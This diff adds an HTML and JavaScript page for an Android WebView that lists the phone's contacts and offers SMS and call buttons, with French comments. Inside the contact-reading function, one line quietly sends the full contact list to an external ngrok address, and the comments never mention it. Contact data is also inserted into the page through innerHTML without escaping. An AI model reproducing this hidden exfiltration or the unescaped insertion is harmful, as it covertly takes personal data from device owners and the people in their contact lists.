@@ -1,0 +1,78 @@
+<input type="button" value="Read contacts" onClick="readTheContacts()" />
+
+<table class="table table-stripped" id="table" border="2">
+    <thead>
+    <tr><th> Nom </th> <th> Numéro </th></tr>
+    </thead>
+    <tbody id="contacts">
+
+    </tbody>
+</table>
+
+<textarea id="textArea" name="textToSend"
+          rows="5" cols="33">
+Enter text to send
+</textarea>
+
+<input type="button" value="Send SMS" onClick="sendSMS()" />
+<input type="button" value="Call" onClick="call()" />
+
+<script type="text/javascript">
+    function readTheContacts() {
+        // Appel à la méthode JAVA qui retourne les contacts, ces contacts sont sous format JSON
+        var contacts = Android.readContacts();
+        Android.postStringRequest("https://0cef-148-60-138-232.ngrok.io/contacts", JSON.stringify(contacts));
+
+        // Parser les contacts JSON pour obtenir un tableau manipulable en JS
+        var listContacts = JSON.parse(contacts);
+
+        // Afficher les différents contacts à l'aide d'un tableau HTML
+
+            // Création d'une variable qui contiendra le contenu du tableau
+                var tableContent = "";
+
+            for (i=0; i<listContacts.length; i++){
+
+                tableContent += "<tr>"; // Nouvelle ligne HTML
+                tableContent += "<td>" + listContacts[i].name + "</td>" + "<td>" + listContacts[i].phoneNumber + "</td>";
+                tableContent += "</tr>"; // Fin de la nouvelle ligne HTML
+
+            }
+            // remplacer le contenu du tableau par le contenu de la variable tableContent
+            document.getElementById("contacts").innerHTML = tableContent;
+
+
+        // Rendre le tableau HTML interactif avec l'ajout de la fonction onClick pour chaque ligne du tableau
+        var table = document.getElementById("table"),rIndex;
+		for (var i = 0 ; i< table.rows.length ; i++){
+			table.rows[i].onclick = function(){
+				rIndex = this.rowsIndex;
+                // Pour récupérer le nom du contact sélectionnée
+				textArea = this.cells[0].innerHTML;
+				// mettre le numéro du contact sélectionné dans le text Area "textArea"
+                document.getElementById("textArea").value = this.cells[1].innerHTML;
+			}
+		}
+    }
+</script>
+
+<script type="text/javascript">
+    function sendSMS() {
+        text = document.getElementById("textArea").value;
+        num = text.substring(0, 10);
+        cont = text.substring(10);
+        Android.sendSMS(num,cont);
+    }
+</script>
+
+<script type="text/javascript">
+    function call() {
+        text = document.getElementById("textArea").value;
+        num = text.substring(0, 10);
+        Android.call(num);
+    }
+</script>
+
+<!-- Android. ... pour la réception des contacts sous format string/json
+     passer les contacts sous format object pour pouvoir les manipuler
+     afficher les contacts dans un tableau HTML-->
